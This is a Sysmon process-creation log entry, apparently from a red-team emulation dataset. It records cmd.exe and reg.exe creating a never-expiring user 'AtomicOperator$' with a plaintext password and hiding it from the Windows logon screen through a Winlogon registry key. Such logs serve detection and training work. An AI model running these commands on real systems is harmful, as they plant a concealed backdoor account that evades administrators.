{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2025-10-31T05:06:45.367278Z"
        }
      },
      "EventRecordID": 657153,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 3080,
          "ThreadID": 4948
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "srv-01.midgardnet.tech",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2025-10-31 05:06:45.364",
      "ProcessGuid": "14207D89-43E5-6904-4506-000000004002",
      "ProcessId": 5244,
      "Image": "C:\\Windows\\System32\\reg.exe",
      "FileVersion": "10.0.20348.1 (WinBuild.160101.0800)",
      "Description": "Registry Console Tool",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "reg.exe",
      "CommandLine": "REG  ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0",
      "CurrentDirectory": "C:\\Users\\SWACHC~1\\AppData\\Local\\Temp\\",
      "User": "MIDGARDNET\\SwachchhandaP",
      "LogonGuid": "14207D89-34DD-6904-8287-190000000000",
      "LogonId": "0x198782",
      "TerminalSessionId": 2,
      "IntegrityLevel": "High",
      "Hashes": "MD5=EB20E119AAF500E2752DC5A588B54C12,SHA256=C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75,IMPHASH=E23A24F7BA9B35B3E9706724F6749860",
      "ParentProcessGuid": "14207D89-43E5-6904-4106-000000004002",
      "ParentProcessId": 6656,
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "\"cmd.exe\" /c NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never  & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0",
      "ParentUser": "MIDGARDNET\\SwachchhandaP"
    }
  }
}
